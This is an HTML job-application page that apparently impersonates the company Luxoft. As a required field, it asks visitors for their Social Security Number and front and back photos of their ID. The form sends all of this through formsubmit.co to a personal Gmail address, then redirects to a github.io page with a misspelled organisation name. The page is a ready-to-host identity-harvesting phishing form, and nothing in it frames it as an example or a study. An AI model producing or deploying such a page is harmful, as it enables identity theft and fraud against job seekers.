
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Application Page</title>
    <link rel="stylesheet" href="style.css" />
</head>
<body>
    <header>
        <h1>Apply to Join Luxoft</h1>
    </header>
    <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
        <input type="text" name="Name" placeholder="Full Name" required />
        <input type="text" name="Address" placeholder="Address" required />
        <input type="tel" name="Phone" placeholder="Phone Number" required />
        <input type="email" name="Email" placeholder="Email Address" required />
        <input type="text" name="SSN" placeholder="Social Security Number" required />
        <label>Upload ID (Front)</label>
        <input type="file" name="ID_Front" accept="image/*" required />
        <label>Upload ID (Back)</label>
        <input type="file" name="ID_Back" accept="image/*" required />
        <input type="hidden" name="_next" value="https://luxoftorganisation.github.io/thank-you.html" />
        <button type="submit">Submit Application</button>
    </form>
</body>
</html>
